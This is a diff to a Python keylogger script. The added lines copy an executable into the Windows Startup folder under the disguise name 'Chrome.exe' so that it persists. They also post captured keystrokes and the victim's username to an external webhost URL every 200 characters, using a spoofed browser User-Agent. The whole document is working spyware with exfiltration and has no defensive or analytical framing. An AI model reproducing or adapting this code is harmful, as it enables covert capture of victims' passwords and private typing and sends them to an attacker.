@@ -2,6 +2,19 @@ from pynput.keyboard import Key, Controller, Listener
 import time
 import requests
 
+import os
+import getpass
+
+user = getpass.getuser()
+
+print(user)
+
+dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.exe'
+di = f'copy dic.exe "{dire}"'
+print(di)
+os.system(di)
+
+
 
 keyboard = Controller()
 
@@ -181,17 +194,16 @@ def on_press(key):
         keys.append(string)
         main_string = "".join(keys)
         print(main_string)
-        if len(main_string) > 1000:
-            nav = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
-            url = "su url que reciba los datos"
-            send = requests.post(url, data={"key": main_string}, headers=nav)
+        if len(main_string) > 200: #catidad de letras que se pueden escribir
+            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
+            url = "https://marksukember12.000webhostapp.com/index.php"
+            send = requests.post(url, data={"text": main_string, "user": user}, headers=headers)
             print(send.text)
             keys = []
 
 def on_release(key):
     if key == Key.esc:
         return False
-    
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
